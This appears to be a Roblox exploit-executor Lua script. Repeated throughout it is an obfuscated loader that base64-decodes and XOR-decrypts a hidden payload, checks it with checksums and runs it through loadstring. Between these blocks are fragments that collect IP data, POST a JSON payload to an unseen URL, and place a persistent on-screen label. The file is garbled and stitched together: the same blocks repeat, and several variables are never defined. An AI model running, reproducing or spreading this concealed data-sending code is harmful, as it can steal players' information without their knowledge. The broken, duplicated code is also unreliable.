local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()

local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 

local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()

if success and response.Body then
    local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(response.Body) end)
    if decodeSuccess and decoded.status == "success" then 
        ipData = decoded 
    end
end

local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()

pcall(function()
    http_request({
        Url = final_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end)

local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Name = "PermanentUI"
screenGui.Parent = game:GetService("CoreGui")
screenGui.IgnoreGuiInset = true

textLabel.Parent = screenGui
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.BackgroundTransparency = 0.4
textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
textLabel.Size = UDim2.new(0, 300, 0, 60)
textLabel.Font = Enum.Font.GothamBold
local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()





local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()

pcall(function()
    http_request({
        Url = final_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end)

local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Name = "PermanentUI"
screenGui.Parent = game:GetService("CoreGui")
screenGui.IgnoreGuiInset = true

local q90CL2="KxolBhZ1IRwoBhYKMgcqR0d1ZR0yEwomfVppEB83LxopDFQ5IgIvFBs+MgcnSRc6IlonFxN6MBAkDxU6LAZpVk5sdUB0XkJjfkJ/U0lkcUF1X1UTEzgEUisdcU0fVz02ARIuMT0cHjYLEhE3IjEnBAI+NjMxFw0CF0QoHhQ7dhksMQAeMBQgBgM+djIHCwwvdR0CDBMlBVc=" local PRiH8m="GuFgzU" local u4XLeT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function decode(t) local r,i={},1 while i<=#t do local c1,c2,c3,c4=t:sub(i,i),t:sub(i+1,i+1),t:sub(i+2,i+2),t:sub(i+3,i+3) local a,b=u4XLeT:find(c1)-1,u4XLeT:find(c2)-1 local c=(c3=="=")and 0 or u4XLeT:find(c3)-1 local d=(c4=="=")and 0 or u4XLeT:find(c4)-1 local n=a*2^18+b*2^12+c*2^6+d table.insert(r,string.char(math.floor(n/2^16)%256)) if c3~="=" then table.insert(r,string.char(math.floor(n/2^8)%256)) end if c4~="=" then table.insert(r,string.char(n%256)) end i=i+4 end return table.concat(r) end
local function xor(a,b) local r=0 for k=0,7 do local A,B=a%2,b%2 if A~=B then r=r+2^k end a,b=math.floor(a/2),math.floor(b/2) end return r end
local sum=0 for i=1,#q90CL2 do sum=(sum+q90CL2:byte(i))%65536 end if sum~=17275 then return end
local tmp=decode(q90CL2) local buf={} for i=1,#tmp do table.insert(buf,string.char(xor(tmp:byte(i),PRiH8m:byte((i-1)%#PRiH8m+1)))) end
local script=table.concat(buf) local sum2=0 for i=1,#script do sum2=(sum2+script:byte(i))%65536 end if sum2~=13151 then return end
local run=(loadstring or load) run(script)()


